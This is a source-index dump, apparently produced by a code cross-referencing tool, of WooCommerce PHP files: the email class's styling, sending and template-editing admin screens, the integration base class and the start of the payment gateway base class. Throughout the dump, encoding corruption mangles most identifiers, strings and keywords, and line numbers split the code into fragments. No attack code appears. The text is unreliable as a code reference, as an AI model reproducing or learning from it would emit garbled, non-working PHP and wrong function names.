	`¬¿y
Ğ
$this
, 'style_inline_h2_tag' ) );

166 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_h3_g', 
	`¬¿y
Ğ
$this
, 'style_inline_h3_tag' ) );

167 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_a_g', 
	`¬¿y
Ğ
$this
, 'style_inline_a_tag' ) );

168 
	`add_f‹r
Ğ'woocomm”û_ema_¡yË_šlše_img_g', 
	`¬¿y
Ğ
$this
, 'style_inline_img_tag' ) );

178 
funùiÚ
 
	$hªdË_muÉ¬t
Ğ
$ma”
 ) {

180 iàĞ
$this
->
£ndšg
 && $this->
	`g‘_ema_ty³
() == 'multipart' ) {

182 
$ma”
->
AÉBody
 = 
	`wÜdw¿p
Ğ
	`´eg_»¶aû
Ğ
$this
->
¶aš_£¬ch
, $this->
¶aš_»¶aû
, 
	`¡r_gs
Ğ$this->
	`g‘_cÚ‹Á_¶aš
() ) ) );

184 
$this
->
£ndšg
 = 
çl£
;

187  
$ma”
;

188 
	}
}

197 
funùiÚ
 
	$fÜm©_¡ršg
Ğ
$¡ršg
 ) {

198  
	`¡r_»¶aû
Ğ
$this
->
fšd
, $this->
»¶aû
, 
$¡ršg
 );

199 
	}
}

206 
funùiÚ
 
	$g‘_subjeù
() {

207  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_' . 
$this
->
id
, $this->
	`fÜm©_¡ršg
Ğ$this->
subjeù
 ), $this->
objeù
 );

208 
	}
}

216 
funùiÚ
 
	$g‘_h—dšg
() {

217  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—dšg_' . 
$this
->
id
, $this->
	`fÜm©_¡ršg
Ğ$this->
h—dšg
 ), $this->
objeù
 );

218 
	}
}

226 
funùiÚ
 
	$g‘_»c›Á
() {

227  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_»c›Á_' . 
$this
->
id
, $this->
»c›Á
, $this->
objeù
 );

228 
	}
}

236 
funùiÚ
 
	$g‘_h—d”s
() {

237  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—d”s', "CÚ‹Á-Ty³: " . 
$this
->
	`g‘_cÚ‹Á_ty³
(è. "\r\n", $this->
id
, $this->
objeù
 );

238 
	}
}

246 
funùiÚ
 
	$g‘_©chm’ts
() {

247  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_©chm’ts', 
	`¬¿y
(), 
$this
->
id
, $this->
objeù
 );

248 
	}
}

256 
funùiÚ
 
	$g‘_ema_ty³
() {

257  
$this
->
ema_ty³
 ? $this->email_type : 'plain';

258 
	}
}

266 
funùiÚ
 
	$g‘_cÚ‹Á_ty³
() {

267  
$this
->
	`g‘_ema_ty³
() ) {

275 
	}
}

284 
funùiÚ
 
	$g‘_İtiÚ
Ğ
$key
, 
$em±y_v®ue
 = 
nuÎ
 ) {

285  
	`__
Ğ
·»Á
::
	`g‘_İtiÚ
Ğ
$key
, 
$em±y_v®ue
 ) );

286 
	}
}

294 
funùiÚ
 
	$is_’abËd
() {

295 
$’abËd
 = 
$this
->
’abËd
 =ğ"yes" ? 
Œue
 : 
çl£
;

297  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_’abËd_' . 
$this
->
id
, 
$’abËd
, $this->
objeù
 );

298 
	}
}

306 
funùiÚ
 
	$g‘_blogÇme
() {

307  
	`wp_¥ecŸlch¬s_decode
Ğ
	`g‘_İtiÚ
Ğ'blogÇme' ), 
ENT_QUOTES
 );

308 
	}
}

316 
funùiÚ
 
	$g‘_cÚ‹Á
() {

318 
$this
->
£ndšg
 = 
Œue
;

320 iàĞ
$this
->
	`g‘_ema_ty³
() == 'plain' ) {

321 
$ema_cÚ‹Á
 = 
	`´eg_»¶aû
Ğ
$this
->
¶aš_£¬ch
, $this->
¶aš_»¶aû
, 
	`¡r_gs
Ğ$this->
	`g‘_cÚ‹Á_¶aš
() ) );

323 
$ema_cÚ‹Á
 = 
$this
->
	`¡yË_šlše
Ğ$this->
	`g‘_cÚ‹Á_html
() );

326  
	`wÜdw¿p
Ğ
$ema_cÚ‹Á
, 70 );

327 
	}
}

336 
funùiÚ
 
	$¡yË_šlše_gs
(
$gs
) {

337  
	`¬¿y_unique
Ğ
	`¬¿y_m”ge
Ğ
$gs
, 
	`¬¿y
( 'h1', 'h2', 'h3', 'a', 'img' ) ) );

338 
	}
}

346 
funùiÚ
 
	$¡yË_šlše_h1_g
(
$¡yËs
) {

347 
$¡yËs
['cŞÜ'] = 
	`g‘_İtiÚ
( 'woocommerce_email_text_color' );

348 
$¡yËs
['display'] = 'block';

349 
$¡yËs
['font-family'] = 'Arial';

350 
$¡yËs
['font-size'] = '34px';

351 
$¡yËs
['font-weight'] = 'bold';

352 
$¡yËs
['margin-top'] = '10px';

353 
$¡yËs
['margin-right'] = '0';

354 
$¡yËs
['margin-bottom'] = '10px';

355 
$¡yËs
['margin-left'] = '0';

356 
$¡yËs
['text-align'] = 'left';

357 
$¡yËs
['line-height'] = '150%';

359  
$¡yËs
;

360 
	}
}

368 
funùiÚ
 
	$¡yË_šlše_h2_g
(
$¡yËs
) {

369 
$¡yËs
['cŞÜ'] = 
	`g‘_İtiÚ
( 'woocommerce_email_text_color' );

370 
$¡yËs
['display'] = 'block';

371 
$¡yËs
['font-family'] = 'Arial';

372 
$¡yËs
['font-size'] = '30px';

373 
$¡yËs
['font-weight'] = 'bold';

374 
$¡yËs
['margin-top'] = '10px';

375 
$¡yËs
['margin-right'] = '0';

376 
$¡yËs
['margin-bottom'] = '10px';

377 
$¡yËs
['margin-left'] = '0';

378 
$¡yËs
['text-align'] = 'left';

379 
$¡yËs
['line-height'] = '150%';

381  
$¡yËs
;

382 
	}
}

391 
funùiÚ
 
	$¡yË_šlše_h3_g
(
$¡yËs
) {

392 
$¡yËs
['cŞÜ'] = 
	`g‘_İtiÚ
( 'woocommerce_email_text_color' );

393 
$¡yËs
['display'] = 'block';

394 
$¡yËs
['font-family'] = 'Arial';

395 
$¡yËs
['font-size'] = '26px';

396 
$¡yËs
['font-weight'] = 'bold';

397 
$¡yËs
['margin-top'] = '10px';

398 
$¡yËs
['margin-right'] = '0';

399 
$¡yËs
['margin-bottom'] = '10px';

400 
$¡yËs
['margin-left'] = '0';

401 
$¡yËs
['text-align'] = 'left';

402 
$¡yËs
['line-height'] = '150%';

404  
$¡yËs
;

405 
	}
}

411 
funùiÚ
 
	$¡yË_šlše_a_g
(
$¡yËs
) {

412 
$¡yËs
['cŞÜ'] = 
	`g‘_İtiÚ
( 'woocommerce_email_text_color' );

413 
$¡yËs
['font-weight'] = 'normal';

414 
$¡yËs
['text-decoration'] = 'underline';

416  
$¡yËs
;

417 
	}
}

426 
funùiÚ
 
	$¡yË_šlše_img_g
(
$¡yËs
) {

427 
$¡yËs
['display'] = 'inline';

428 
$¡yËs
['border'] = 'none';

429 
$¡yËs
['font-size'] = '14px';

430 
$¡yËs
['font-weight'] = 'bold';

431 
$¡yËs
['height'] = 'auto';

432 
$¡yËs
['line-height'] = '100%';

433 
$¡yËs
['outline'] = 'none';

434 
$¡yËs
['text-decoration'] = 'none';

435 
$¡yËs
['text-transform'] = 'capitalize';

437  
$¡yËs
;

438 
	}
}

446 
funùiÚ
 
	$g‘_¡yË_šlše_gs
() {

447  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_¡yË_šlše_gs', 
	`¬¿y
() );

448 
	}
}

457 
funùiÚ
 
	$g‘_¡yË_šlše_fÜ_g
(
$g
) {

458 
$¡yËs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ema_¡yË_šlše_' . 
$g
 . '_g', 
	`¬¿y
() );

459 
$css
 = 
	`¬¿y
();

461 
	`fÜ—ch
Ğ
$¡yËs
 
as
 
$´İ”ty
 => 
$v®ue
 ) {

462 
$css
[] = 
$´İ”ty
 . ':' . 
$v®ue
;

465  
	`im¶ode
('; ', 
$css
);

466 
	}
}

475 
funùiÚ
 
	$¡yË_šlše
Ğ
$cÚ‹Á
 ) {

476 iàĞ! 
	`şass_exi¡s
( 'DOMDocument' ) ) {

477  
$cÚ‹Á
;

480 
$dom
 = 
Ãw
 
	`DOMDocum’t
();

481 
	`libxml_u£_š‹º®_”rÜs
Ğ
Œue
 );

482 @
$dom
->
	`lßdHTML
Ğ
$cÚ‹Á
 );

483 
	`libxml_ş—r_”rÜs
();

485 
	`fÜ—ch
Ğ
$this
->
	`g‘_¡yË_šlše_gs
(è
as
 
$g
 ) {

486 
$nodes
 = 
$dom
->
	`g‘EËm’tsByTagName
(
$g
);

488 
	`fÜ—ch
Ğ
$nodes
 
as
 
$node
 ) {

489 iàĞ! 
$node
->
	`hasA‰ribu‹
( 'style' ) ) {

490 
$node
->
	`£tA‰ribu‹
Ğ'¡yË', 
$this
->
	`g‘_¡yË_šlše_fÜ_g
(
$g
) );

495 
$cÚ‹Á
 = 
$dom
->
	`§veHTML
();

497  
$cÚ‹Á
;

498 
	}
}

506 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
(è{
	}
}

514 
funùiÚ
 
	$g‘_cÚ‹Á_html
(è{
	}
}

522 
funùiÚ
 
	$g‘_äom_Çme
() {

523  
	`wp_¥ecŸlch¬s_decode
Ğ
	`esc_html
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_ema_äom_Çme' ) ), 
ENT_QUOTES
 );

524 
	}
}

532 
funùiÚ
 
	$g‘_äom_add»ss
() {

533  
	`§n™ize_ema
Ğ
	`g‘_İtiÚ
( 'woocommerce_email_from_address' ) );

534 
	}
}

547 
funùiÚ
 
	$£nd
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 ) {

548 
	`add_f‹r
Ğ'wp_ma_äom', 
	`¬¿y
Ğ
$this
, 'get_from_address' ) );

549 
	`add_f‹r
Ğ'wp_ma_äom_Çme', 
	`¬¿y
Ğ
$this
, 'get_from_name' ) );

550 
	`add_f‹r
Ğ'wp_ma_cÚ‹Á_ty³', 
	`¬¿y
Ğ
$this
, 'get_content_type' ) );

552 
$»tuº
 = 
	`wp_ma
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

554 
	`»move_f‹r
Ğ'wp_ma_äom', 
	`¬¿y
Ğ
$this
, 'get_from_address' ) );

555 
	`»move_f‹r
Ğ'wp_ma_äom_Çme', 
	`¬¿y
Ğ
$this
, 'get_from_name' ) );

556 
	`»move_f‹r
Ğ'wp_ma_cÚ‹Á_ty³', 
	`¬¿y
Ğ
$this
, 'get_content_type' ) );

558  
$»tuº
;

559 
	}
}

567 
funùiÚ
 
	$š™_fÜm_f›lds
() {

568 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

569 '’abËd' => 
	`¬¿y
(

570 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

572 'Ïb–' => 
	`__
( 'Enablehisƒmail‚otification', 'woocommerce' ),

575 'subjeù' => 
	`¬¿y
(

576 't™Ë' => 
	`__
( 'Email subject', 'woocommerce' ),

578 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
subjeù
 ),

582 'h—dšg' => 
	`¬¿y
(

583 't™Ë' => 
	`__
( 'Email heading', 'woocommerce' ),

585 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
h—dšg
 ),

589 'ema_ty³' => 
	`¬¿y
(

590 't™Ë' => 
	`__
( 'Emailype', 'woocommerce' ),

592 'desütiÚ' => 
	`__
( 'Choose which format ofƒmailo send.', 'woocommerce' ),

595 'İtiÚs' => 
	`¬¿y
(

596 '¶aš' => 
	`__
( 'Plainext', 'woocommerce' ),

597 'html' => 
	`__
( 'HTML', 'woocommerce' ),

598 'muÉ¬t' => 
	`__
( 'Multipart', 'woocommerce' ),

602 
	}
}

612 
public
 
funùiÚ
 
	$´oûss_admš_İtiÚs
() {

615 
·»Á
::
	`´oûss_admš_İtiÚs
();

618 iàĞ! 
	`em±y
Ğ
$_POST
['‹m¶©e_html_code'] ) && !ƒm±yĞ
$this
->
‹m¶©e_html
 ) ) {

620 
$§ved
 = 
çl£
;

621 
$fe
 = 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
‹m¶©e_html
;

622 
$code
 = 
	`¡r¦ashes
Ğ
$_POST
['template_html_code'] );

624 iàĞ
	`is_wr™—bË
Ğ
$fe
 ) ) {

625 
$f
 = 
	`fİ’
Ğ
$fe
, 'w+' );

626 iàĞ
$f
 !=ğ
FALSE
 ) {

627 
	`fwr™e
Ğ
$f
, 
$code
 );

628 
	`fşo£
Ğ
$f
 );

629 
$§ved
 = 
Œue
;

633 iàĞ! 
$§ved
 ) {

634 
$»dœeù
 = 
	`add_qu”y_¬g
Ğ'wc_”rÜ', 
	`u¾’code
Ğ
	`__
( 'Could‚ot writeoemplate file.', 'woocommerce' ) ) );

635 
	`wp_»dœeù
Ğ
$»dœeù
 );

636 
ex™
;

639 iàĞ! 
	`em±y
Ğ
$_POST
['‹m¶©e_¶aš_code'] ) && !ƒm±yĞ
$this
->
‹m¶©e_¶aš
 ) ) {

641 
$§ved
 = 
çl£
;

642 
$fe
 = 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
‹m¶©e_¶aš
;

643 
$code
 = 
	`¡r¦ashes
Ğ
$_POST
['template_plain_code'] );

645 iàĞ
	`is_wr™—bË
Ğ
$fe
 ) ) {

646 
$f
 = 
	`fİ’
Ğ
$fe
, 'w+' );

647 iàĞ
$f
 !=ğ
FALSE
 ) {

648 
	`fwr™e
Ğ
$f
, 
$code
 );

649 
	`fşo£
Ğ
$f
 );

650 
$§ved
 = 
Œue
;

654 iàĞ! 
$§ved
 ) {

655 
$»dœeù
 = 
	`add_qu”y_¬g
Ğ'wc_”rÜ', 
	`__
( 'Could‚ot writeoemplate file.', 'woocommerce' ) );

656 
	`wp_»dœeù
Ğ
$»dœeù
 );

657 
ex™
;

660 
	}
}

672 
funùiÚ
 
	$admš_İtiÚs
() {

675 iàĞ! 
	`em±y
Ğ
$this
->
‹m¶©e_html
 ) || !ƒm±yĞ$this->
‹m¶©e_¶aš
 ) ) {

677 iàĞ! 
	`em±y
Ğ
$_GET
['move_‹m¶©e'] ) && ( 
$‹m¶©e
 = 
	`esc_©Œ
Ğ
	`ba£Çme
( $_GET['move_template'] ) ) ) ) {

678 iàĞ! 
	`em±y
Ğ
$this
->
$‹m¶©e
 ) ) {

679 iàĞ
	`wp_mkdœ_p
Ğ
	`dœÇme
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
$‹m¶©e
 ) ) && ! 
	`fe_exi¡s
( get_stylesheet_directory() . '/woocommerce/' . $this->$template ) ) {

681 
$cÜe_fe
 = 
$this
->
‹m¶©e_ba£
 . $this->
$‹m¶©e
;

682 
$‹m¶©e_fe
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_loÿ‹_cÜe_‹m¶©e', 
$cÜe_fe
, 
$this
->
$‹m¶©e
, $this->
‹m¶©e_ba£
 );

685 
	`cİy
Ğ
$‹m¶©e_fe
, 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
$‹m¶©e
 );

686 
echo
 '<div cÏss="upd©ed fade"><p>' . 
	`__
( 'Template file copiedoheme.', 'woocommerce' ) . '</p></div>';

691 iàĞ! 
	`em±y
Ğ
$_GET
['d–‘e_‹m¶©e'] ) && ( 
$‹m¶©e
 = 
	`esc_©Œ
Ğ
	`ba£Çme
( $_GET['delete_template'] ) ) ) ) {

692 iàĞ! 
	`em±y
Ğ
$this
->
$‹m¶©e
 ) ) {

693 iàĞ
	`fe_exi¡s
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
$‹m¶©e
 ) ) {

694 
	`uÆšk
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
$‹m¶©e
 );

695 
echo
 '<div cÏss="upd©ed fade"><p>' . 
	`__
( 'Template file deleted fromheme.', 'woocommerce' ) . '</p></div>';

703 <
h3
><?
php
 
	`echo
 ( ! 
	`em±y
Ğ
$this
->
t™Ë
 ) ) ? $this->t™Ë : 
	`__
( 'Settings','woocommerce' ) ; ?></h3>

705 <?
php
 
	`echo
 ( ! 
	`em±y
Ğ
$this
->
desütiÚ
 ) ) ? 
	`w·utİ
( $this->description ) : ''; ?>

707 <
bË
 
şass
="form-table">

708 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

709 </
bË
>

711 <?
php
 iàĞ! 
	`em±y
Ğ
$this
->
‹m¶©e_html
 ) || !ƒm±yĞ$this->
‹m¶©e_¶aš
 ) ) { ?>

712 <
div
 
id
="template">

713 <?
php


714 
$‹m¶©es
 = 
	`¬¿y
(

715 '‹m¶©e_html' => 
	`__
( 'HTMLemplate', 'woocommerce' ),

716 '‹m¶©e_¶aš' => 
	`__
( 'Plainextemplate', 'woocommerce' )

718 
	`fÜ—ch
 ( 
$‹m¶©es
 
as
 
$‹m¶©e
 => 
$t™Ë
 ) :

719 iàĞ
	`em±y
Ğ
$this
->
$‹m¶©e
 ) ) {

723 
$loÿl_fe
 = 
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/' . 
$this
->
$‹m¶©e
;

724 
$cÜe_fe
 = 
$this
->
‹m¶©e_ba£
 . $this->
$‹m¶©e
;

725 
$‹m¶©e_fe
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_loÿ‹_cÜe_‹m¶©e', 
$cÜe_fe
, 
$this
->
$‹m¶©e
, $this->
‹m¶©e_ba£
 );

727 <
div
 
şass
="template <?phpƒcho $template; ?>">

729 <
h4
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$t™Ë
 ); ?></h4>

731 <?
php
 iàĞ
	`fe_exi¡s
Ğ
$loÿl_fe
 ) ) { ?>

733 <
p
>

734 <
a
 
h»f
="#" 
şass
="buttonoggle_editor"></a>

736 <?
php
 iàĞ
	`is_wr™abË
Ğ
$loÿl_fe
 ) ) : ?>

737 <
a
 
h»f
="<?ph°echØ»move_qu”y_¬gĞ¬¿yĞ'move_‹m¶©e', '§ved' ),‡dd_qu”y_¬gĞ'd–‘e_‹m¶©e', $‹m¶©è); ?>" 
şass
="d–‘e_‹m¶©bu‰Ú"><?
php
 
	`_e
( 'Deleteemplate file', 'woocommerce' ); ?></a>

738 <?
php
 
’dif
; ?>

740 <?
php
 
	`´štf
Ğ
	`__
Ğ'Thi ‹m¶©ha b“Àov”ridd’ by you¸themªd cª bfound in: <code>%s</code>.', 'woocomm”û' ), 'you¹heme/woocomm”û/' . 
$this
->
$‹m¶©e
 ); ?>

741 </
p
>

743 <
div
 
şass
="ed™Ü" 
¡yË
="display:none">

745 <
‹x»a
 
şass
="code" 
cŞs
="25" 
rows
="20" <?
php
 iàĞ! 
	`is_wr™abË
Ğ
$loÿl_fe
 ) ) : ?>
»adÚly
="»adÚly" 
di§bËd
="di§bËd"<?ph°: ?>
d©a
-
Çme
="<?ph°echØ$‹m¶©. '_code'; ?>"<?ph°
’dif
; ?>><?ph°
echo
 
	`fe_g‘_cÚ‹Ás
( $local_file ); ?></textarea>

747 </
div
>

749 <?
php
 } 
	`–£if
 ( 
	`fe_exi¡s
Ğ
$‹m¶©e_fe
 ) ) { ?>

751 <
p
>

752 <
a
 
h»f
="#" 
şass
="buttonoggle_editor"></a>

754 <?
php
 iàĞĞ
	`is_dœ
Ğ
	`g‘_¡yËsh“t_dœeùÜy
(è. '/woocomm”û/emas/' ) && 
	`is_wr™abË
( get_stylesheet_directory() . '/woocommerce/emails/' ) ) || is_writable( get_stylesheet_directory() ) ) { ?>

755 <
a
 
h»f
="<?ph°echØ»move_qu”y_¬gĞ¬¿yĞ'd–‘e_‹m¶©e', '§ved' ),‡dd_qu”y_¬gĞ'move_‹m¶©e', $‹m¶©è); ?>" 
şass
="bu‰Ú"><?
php
 
	`_e
( 'Copy fileoheme', 'woocommerce' ); ?></a>

756 <?
php
 } ?>

758 <?
php
 
	`´štf
Ğ
	`__
Ğ'TØov”ridªdƒd™hi emaem¶©cİy <code>%s</code>Øyou¸themfŞd”: <code>%s</code>.', 'woocomm”û' ), 
	`¶ugš_ba£Çme
Ğ
$‹m¶©e_fe
 ) , 'you¹heme/woocomm”û/' . 
$this
->
$‹m¶©e
 ); ?>

759 </
p
>

761 <
div
 
şass
="ed™Ü" 
¡yË
="display:none">

763 <
‹x»a
 
şass
="code" 
»adÚly
="»adÚly" 
di§bËd
="di§bËd" 
cŞs
="25" 
rows
="20"><?
php
 
echo
 
	`fe_g‘_cÚ‹Ás
Ğ
$‹m¶©e_fe
 ); ?></textarea>

765 </
div
>

767 <?
php
 } { ?>

769 <
p
><?
php
 
	`_e
( 'File was‚ot found.', 'woocommerce' ); ?></p>

771 <?
php
 } ?>

773 </
div
>

774 <?
php


775 
’dfÜ—ch
;

777 </
div
>

778 <?
php


779 
	`wc_’queue_js
("

780 
	`jQu”y
('£Ëù.ema_ty³').
	`chªge
(
	`funùiÚ
(){

782 
v¬
 
v®
 = 
	`jQu”y
Ğ
this
 ).
	`v®
();

784 
	`jQu”y
('.‹m¶©e_¶aš, .‹m¶©e_html').
	`show
();

786 iàĞ
v®
 != 'multipart' && val != 'html' )

787 
	`jQu”y
('.‹m¶©e_html').
	`hide
();

789 iàĞ
v®
 != 'multipart' && val != 'plain' )

790 
	`jQu”y
('.‹m¶©e_¶aš').
	`hide
();

792 }).
	`chªge
();

794 
v¬
 
v›w
 = '" .ƒsc_jsĞ__Ğ'
V›w
 
‹m¶©e
', '
woocomm”û
' ) ) . "';

795 
v¬
 
hide
 = '" .ƒsc_jsĞ__Ğ'
Hide
 
‹m¶©e
', '
woocomm”û
' ) ) . "';

797 
	`jQu”y
('a.toggË_ed™Ü').
	`‹xt
Ğ
v›w
 ).
	`toggË
Ğ
	`funùiÚ
() {

798 
	`jQu”y
Ğ
this
 ).
	`‹xt
Ğ
hide
 ).
	`şo£¡
('.‹m¶©e').
	`fšd
('.ed™Ü').
	`¦ideToggË
();

799  
çl£
;

800 }, 
	`funùiÚ
() {

801 
	`jQu”y
Ğ
this
 ).
	`‹xt
Ğ
v›w
 ).
	`şo£¡
('.‹m¶©e').
	`fšd
('.ed™Ü').
	`¦ideToggË
();

802  
çl£
;

805 
	`jQu”y
('a.d–‘e_‹m¶©e').
	`şick
(
	`funùiÚ
(){

806 
v¬
 
ªsw”
 = 
	`cÚfœm
('" .ƒsc_jsĞ__Ğ'
A»
 
you
 
su»
 you 
wªt
 
to
 
d–‘e
 
this
 
‹m¶©e
 
fe
?', '
woocomm”û
' ) ) . "');

808 ià(
ªsw”
)

809  
Œue
;

811  
çl£
;

814 
	`jQu”y
('.ed™Üex»a').
	`chªge
(
	`funùiÚ
(){

815 
v¬
 
Çme
 = 
	`jQu”y
(
this
).
	`©Œ
( 'data-name' );

817 iàĞ
Çme
 )

818 
	`jQu”y
(
this
).
	`©Œ
Ğ'Çme', 
Çme
 );

822 
	}
}

	@includes/abstracts/abstract-wc-integration.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

17 
ab¡¿ù
 cÏs 
	cWC_IÁeg¿tiÚ
 
ex‹nds
 
	mWC_S‘tšgs_API
 {

28 
public
 
funùiÚ
 
	$admš_İtiÚs
() { ?>

30 <
h3
><?
php
 
echo
 
	`is£t
Ğ
$this
->
m‘hod_t™Ë
 ) ? $this->m‘hod_t™Ë : 
	`__
( 'Settings', 'woocommerce' ) ; ?></h3>

32 <?
php
 
echo
 
	`is£t
Ğ
$this
->
m‘hod_desütiÚ
 ) ? 
	`w·utİ
( $this->method_description ) : ''; ?>

34 <
bË
 
şass
="form-table">

35 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

36 </
bË
>

38 <!-- 
SeùiÚ
 -->

39 <
div
><
šput
 
ty³
="hidd’" 
Çme
="£ùiÚ" 
v®ue
="<?phpƒcho $this->id; ?>" /></div>

41 <?
php


43 
	}
}

	@includes/abstracts/abstract-wc-payment-gateway.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

17 
ab¡¿ù
 cÏs 
	cWC_Paym’t_G©eway
 
ex‹nds
 
	mWC_S‘tšgs_API
 {

20 
v¬
 
	m$id
;

23 
v¬
 
	m$Üd”_bu‰Ú_‹xt
;

26 
v¬
 
	m$t™Ë
;

29 
v¬
 
	m$cho£n
;

32 
v¬
 
	m$has_f›lds
;

35 
v¬
 
	m$couÁr›s
;

38 
v¬
 
	m$avaab™y
;

41 
v¬
 
	m$’abËd
;

44 
v¬
 
	m$icÚ
;

47 
v¬
 
	m$desütiÚ
;

50 
v¬
 
	m$suµÜts
 = 
¬¿y
( 'products' );

53 
public
 
	m$max_amouÁ
 = 0;

62 
public
 
funùiÚ
 
g‘_»tuº_u¾
Ğ
$Üd”
 = '' ) {

63 iàĞ
$Üd”
 ) {

64 
$»tuº_u¾
 = 
$Üd”
->
g‘_checkout_Üd”_»ûived_u¾
();

66 
	m$»tuº_u¾
 = 
wc_g‘_’dpošt_u¾
Ğ'Üd”-»ûived', '', 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'checkout' ) ) );

69 iàĞ
is_s¦
(è|| 
g‘_İtiÚ
('woocommerce_force_ssl_checkout') == 'yes' ) {

70 
$»tuº_u¾
 = 
¡r_»¶aû
( 'http:', 'https:', $return_url );

73  
­¶y_f‹rs
Ğ'woocomm”û_g‘_»tuº_u¾', 
$»tuº_u¾
 );

81 
´Ùeùed
 
funùiÚ
 
	$g‘_Üd”_tÙ®
() {

82 
$tÙ®
 = 0;

83 
$Üd”_id
 = 
	`absšt
Ğ
	`g‘_qu”y_v¬
( 'order-pay' ) );

86 iàĞ0 < 
$Üd”_id
 ) {

87 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

88 
$tÙ®
 = (è
$Üd”
->
	`g‘_tÙ®
();

91 } 
	`–£if
 ( 0 < 
	`WC
()->
ÿ¹
->
tÙ®
 ) {

92 
$tÙ®
 = (è
	`WC
()->
ÿ¹
->
tÙ®
;

95  
$tÙ®
;

96 
	}
}

104 
public
 
funùiÚ
 
	$is_avaabË
() {

105 
$is_avaabË
 = ( 'yes' ==ğ
$this
->
’abËd
 ) ? 
Œue
 : 
çl£
;

107 iàĞ0 < 
$this
->
	`g‘_Üd”_tÙ®
(è&& $this->
max_amouÁ
 >= $this->get_order_total() ) {

108 
$is_avaabË
 = 
çl£
;

111  
$is_avaabË
;

112 
	}
}

120 
public
 
funùiÚ
 
	$has_f›lds
() {

121  
$this
->
has_f›lds
 ? 
Œue
 : 
çl£
;

122 
	}
}

130 
public
 
funùiÚ
 
	$g‘_t™Ë
() {

131  
	`­¶y_f‹rs
Ğ'woocomm”û_g©eway_t™Ë', 
$this
->
t™Ë
, $this->
id
 );

132 
	}
}

140 
public
 
funùiÚ
 
	$g‘_desütiÚ
() {

141  
	`­¶y_f‹rs
Ğ'woocomm”û_g©eway_desütiÚ', 
$this
->
desütiÚ
, $this->
id
 );

142 
	}
}

150 
public
 
funùiÚ
 
	$g‘_icÚ
() {

152 
$icÚ
 = 
$this
->
icÚ
 ? '<img src="' . 
WC_HTTPS
::
	`fÜû_h‰ps_u¾
Ğ$this->icÚ ) . '"‡É="' . 
	`esc_©Œ
Ğ$this->
	`g‘_t™Ë
() ) . '" />' : '';

154  
	`­¶y_f‹rs
Ğ'woocomm”û_g©eway_icÚ', 
$icÚ
, 
$this
->
id
 );

155 
	}
}

165 
public
 
funùiÚ
 
	$£t_cu¼’t
() {

166 
$this
->
cho£n
 = 
Œue
;

167 
	}
}

178 
public
 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {
	}
}

188 
public
 
funùiÚ
 
	$v®id©e_f›lds
(è{  
Œue
; 
	}
}

197 
public
 
funùiÚ
 
	$·ym’t_f›lds
() {

198 iàĞ
$desütiÚ
 = 
$this
->
	`g‘_desütiÚ
() ) {

199 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$desütiÚ
 ) );

202 iàĞ
$this
->
	`suµÜts
( 'default_credit_card_form' ) ) {

203 
$this
->
	`üed™_ÿrd_fÜm
();

205 
	}
}

218 
public
 
funùiÚ
 
	$suµÜts
Ğ
$ã©u»
 ) {

219  
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_g©eway_suµÜts', 
	`š_¬¿y
Ğ
$ã©u»
, 
$this
->
suµÜts
 ) ? 
Œue
 : 
çl£
, $feature, $this );

220 
	}
}

227 
public
 
funùiÚ
 
üed™_ÿrd_fÜm
Ğ
$¬gs
 = 
¬¿y
(), 
$f›lds
 = 
	$¬¿y
() ) {

228 
	`wp_’queue_süt
( 'wc-credit-card-form' );

230 
$deçuÉ_¬gs
 = 
	`¬¿y
(

231 'f›lds_have_Çmes' => 
Œue
,

234 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
	`­¶y_f‹rs
Ğ'woocomm”û_üed™_ÿrd_fÜm_¬gs', 
$deçuÉ_¬gs
, 
$this
->
id
 ) );

236 
$deçuÉ_f›lds
 = 
	`¬¿y
(

238 <
Ïb–
 ="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-numb”">' . __Ğ'
C¬d
 
Numb”
', '
woocomm”û
' ) . ' <
¥ª
 
şass
="required">*</span></label>

239 <
šput
 
id
="' .ƒsc_©ŒĞ$this->id ) . '-ÿrd-numb”" 
şass
